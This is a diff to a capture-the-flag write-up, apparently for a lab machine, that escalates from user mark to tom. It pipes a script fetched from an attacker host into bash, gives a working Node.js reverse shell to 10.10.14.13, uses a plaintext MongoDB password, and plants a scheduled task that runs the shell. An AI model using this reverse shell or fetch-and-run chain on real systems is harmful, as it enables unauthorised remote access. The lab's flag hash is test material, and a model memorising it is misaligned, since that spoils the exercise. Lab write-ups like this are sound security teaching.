@@ -60,5 +60,34 @@ cat: user.txt: Permission denied
 I need a way to escalate privileges to tom. I like using the linux privilege escalation script to check what I can find. So I open up a local server
 python -m http.server and curl http://10.10.14.13:8000/linpeas.sh | bash
 
+ps aux  | grep tom
+tom       1219  0.0  5.0 1008568 38024 ?       Ssl  11:28   0:03 /usr/bin/node /var/scheduler/app.js
+tom       1220  0.0  8.5 1042268 64468 ?       Ssl  11:28   0:06 /usr/bin/node /var/www/myplace/app.js
+mark     10668  0.0  0.1  14228  1088 pts/0    S+   17:18   0:00 grep --color=auto tom
 
- 
+We check the app.js source code and we notice it is running as tom. We can create a reverse shell, login to mongodb and schedule the task to run and
+this will give us a shell.
+(function(){
+    var net = require("net"),
+        cp = require("child_process"),
+        sh = cp.spawn("/bin/sh", []);
+    var client = new net.Socket();
+    client.connect(1234, "10.10.14.13", function(){
+        client.pipe(sh.stdin);
+        sh.stdout.pipe(client);
+        sh.stderr.pipe(client);
+    });
+    return /a/; // Prevents the Node.js application form crashing
+})();
+
+Login to mongodb: mongo localhost:27017/scheduler -u mark -p 5AYRft73VtFpc84k
+Schedule a task: db.tasks.insertOne({cmd:"/usr/bin/node /dev/shm/shell.js"})
+On our netcat listener, a shell as tom is spawned and user flag pawned!
+tom@node:~$ cat user.txt
+cat user.txt
+e1156acc3574e04b06908ecf76be91b1
+===================Priv Escalation==================
+
+
+References:
+1. https://github.com/appsecco/vulnerable-apps/tree/master/node-reverse-shell
